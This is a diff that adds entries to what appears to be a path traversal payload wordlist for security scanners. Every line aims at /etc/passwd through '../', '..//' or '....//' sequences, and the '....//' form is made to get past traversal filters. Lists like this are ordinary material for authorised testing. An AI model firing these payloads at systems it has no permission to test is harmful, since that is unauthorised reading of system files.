@@ -1,3 +1,4 @@
+/etc/passwd
 ..//etc/passwd
 ../..//etc/passwd
 ../../..//etc/passwd
@@ -757,6 +758,14 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ..//..//..//..//..//..///etc/passwd
 ..//..//..//..//..//..//..///etc/passwd
 ..//..//..//..//..//..//..//..///etc/passwd
+..///etc/passwd
+....//....///etc/passwd
+....//....//....///etc/passwd
+....//....//....//....///etc/passwd
+....//....//....//....//....///etc/passwd
+....//....//....//....//....//....///etc/passwd
+....//....//....//....//....//....//....///etc/passwd
+....//....//....//....//....//....//....//....///etc/passwd
 ..////etc/passwd
 ..///..////etc/passwd
 ..///..///..////etc/passwd
